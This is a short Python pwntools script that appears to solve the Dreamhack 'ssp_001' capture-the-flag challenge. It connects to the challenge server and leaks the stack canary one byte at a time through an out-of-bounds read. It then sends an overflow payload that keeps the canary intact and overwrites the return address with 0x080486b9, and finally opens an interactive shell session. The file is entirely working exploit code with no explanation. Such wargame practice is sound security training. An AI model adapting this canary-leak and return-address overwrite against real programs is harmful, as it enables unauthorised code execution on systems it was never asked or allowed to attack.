# Name: ssp_001.py

from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'

HOST = 'host3.dreamhack.games'
PORT = 14442 # The given port

# conn = process('./ssp_001')
conn = remote(HOST, PORT)

canary = 0
ret = 0x080486b9
payload = b'A' * 0x40
for i in range(4):
    conn.sendlineafter(b'> ', b'P')
    conn.sendlineafter(b'Element index : ', str(i + 0x80).encode('ASCII'))
    conn.recvuntil(b'is : ')
    canary += 256 ** i * int(conn.recv(2), base=16)
payload += p32(canary)
payload += b'A' * 0x8
payload += p32(ret)

conn.sendlineafter(b'> ', b'E')
conn.sendlineafter(b'Name Size : ', str(len(payload)).encode('ASCII'))
conn.recvuntil(b'Name : ')
conn.send(payload)

conn.interactive()